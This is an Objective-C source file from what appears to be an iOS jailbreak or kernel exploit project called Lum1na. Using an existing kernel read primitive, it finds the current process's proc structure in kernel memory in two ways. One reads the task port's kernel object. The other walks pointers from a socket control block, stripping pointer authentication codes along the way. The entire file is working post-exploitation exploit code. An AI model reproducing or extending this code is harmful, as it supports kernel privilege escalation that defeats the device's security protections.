//
//  Lum1naProcFind.m
//  Lum1na
//

#import "Lum1naProcFind.h"
#import "Lum1naKreadLane.h"
#import "../Exploit/lumina_core.h"

#import <mach/mach.h>
#import <mach/mach_port.h>
#import <dlfcn.h>

#include <unistd.h>

/* The iOS SDK does not always expose the MIG prototype; P140 resolves the
   same routine with dlsym. Signature matches mach/mach_port.h. */
typedef kern_return_t (*lp_kobject_fn)(ipc_space_t, mach_port_name_t,
                                       mach_port_type_t *, mach_vm_address_t *);
static lp_kobject_fn lp_kobject(void) {
    static lp_kobject_fn fn;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        fn = (lp_kobject_fn)dlsym(RTLD_DEFAULT, "mach_port_kobject");
    });
    return fn;
}

/* task->map is stable at 0x28 across the iOS 15/16/17/18 ladders
   (Dopamine info.c task.map = 0x28). Used only to sanity-check that the
   kobject really is a task_t before scanning it. */
#define LP_TASK_MAP 0x28

static uint64_t lp_kread64(uint64_t a) { return Lum1naLaneKRead64(a); }
static uint32_t lp_kread32(uint64_t a) { return Lum1naLaneKRead32(a); }
extern uint64_t cs2_unpac_ptr(uint64_t kptr);
static BOOL lp_kernel(uint64_t v) { return v >= 0xffff000000000000ULL; }
static uint64_t lp_ptr(uint64_t a) {
    uint64_t v = lp_kread64(a);
    if (!lp_kernel(v)) v = cs2_unpac_ptr(v);
    return v;
}

/// A proc candidate is accepted only when pid at +pidOff is ours AND the
/// proc_ro pointer at +procRoOff is a zone pointer AND the pid still reads
/// ours after that second read. A stale/wrong pointer cannot pass all three.
static uint64_t lp_try_proc(uint64_t cand, uint32_t pid, uint32_t pidOff,
                            uint32_t procRoOff) {
    if (!cand || !lumina_kptr_zone(cand)) return 0;
    if (lp_kread32(cand + pidOff) != pid) return 0;
    uint64_t pro = lp_kread64(cand + procRoOff);
    if (!pro || !lumina_kptr_zone(pro)) return 0;
    if (lp_kread32(cand + pidOff) != pid) return 0;
    return cand;
}

uint64_t Lum1naFindSelfProc(uint32_t pid, uint32_t pidOff, uint32_t procRoOff,
                            NSString **how) {
    if (how) *how = @"none";
    if (!pid || !pidOff || !procRoOff) return 0;

    mach_port_type_t ptype = 0;
    mach_vm_address_t kobj = 0;
    lp_kobject_fn kobj_fn = lp_kobject();
    if (!kobj_fn) {
        if (how) *how = @"mach_port_kobject symbol missing";
        return 0;
    }
    kern_return_t kr = kobj_fn(mach_task_self(), mach_task_self(),
                               &ptype, &kobj);
    if (kr != KERN_SUCCESS || !kobj) {
        if (how) *how = [NSString stringWithFormat:
            @"mach_port_kobject refused (kr=0x%x type=0x%x)", kr, ptype];
        return 0;
    }

    /* The kobject for a task port is task_t. Validate before trusting the
       scan: task->map must be a zone pointer. If it is not, the locator
       returned an ipc_port or a different object — refuse rather than scan
       an arbitrary kernel object. */
    uint64_t map = lp_kread64((uint64_t)kobj + LP_TASK_MAP);
    if (!lumina_kptr_zone(map)) {
        if (how) *how = [NSString stringWithFormat:
            @"kobject 0x%llx is not a task (map=0x%llx)",
            (unsigned long long)kobj, (unsigned long long)map];
        return 0;
    }

    for (uint32_t off = 0; off < 0x1000; off += 8) {
        uint64_t q = lp_kread64((uint64_t)kobj + off);
        uint64_t p = lp_try_proc(q, pid, pidOff, procRoOff);
        if (p) {
            if (how) *how = [NSString stringWithFormat:
                @"task 0x%llx -> bsd_info@+0x%x -> proc 0x%llx",
                (unsigned long long)kobj, off, (unsigned long long)p];
            return p;
        }
    }

    if (how) *how = [NSString stringWithFormat:
        @"task 0x%llx scanned 0x1000, no proc with pid %u",
        (unsigned long long)kobj, pid];
    return 0;
}

uint64_t Lum1naFindSelfProcViaSocket(const LabProcOffTab *po, uint32_t pid,
                                     uint64_t rwSocketPcb, NSString **how) {
    if (how) *how = @"none";
    if (!po || !rwSocketPcb || !po->inpcb_inp_socket ||
        !po->socket_so_background_thread || !po->thread_t_ro ||
        !po->thread_ro_proc) {
        if (how) *how = @"22G100 traversal offsets not pinned";
        return 0;
    }
    uint64_t sock = lp_ptr(rwSocketPcb + po->inpcb_inp_socket);
    if (!lp_kernel(sock)) { if (how) *how = @"inpcb->socket failed"; return 0; }
    uint64_t thread = lp_ptr(sock + po->socket_so_background_thread);
    if (!lp_kernel(thread)) { if (how) *how = @"socket->so_background_thread failed"; return 0; }
    uint64_t tro = lp_ptr(thread + po->thread_t_ro);
    if (!lp_kernel(tro)) { if (how) *how = @"thread->t_ro failed"; return 0; }
    uint64_t proc = lp_ptr(tro + po->thread_ro_proc);
    if (!lp_kernel(proc)) { if (how) *how = @"thread_ro->proc failed"; return 0; }
    if (pid && lp_kread32(proc + po->proc_pid) != pid) {
        if (how) *how = [NSString stringWithFormat:
            @"proc 0x%llx pid mismatch", (unsigned long long)proc];
        return 0;
    }
    if (how) *how = [NSString stringWithFormat:
        @"pcb 0x%llx -> socket 0x%llx -> thread 0x%llx -> t_ro 0x%llx -> proc 0x%llx",
        (unsigned long long)rwSocketPcb, (unsigned long long)sock,
        (unsigned long long)thread, (unsigned long long)tro,
        (unsigned long long)proc];
    return proc;
}
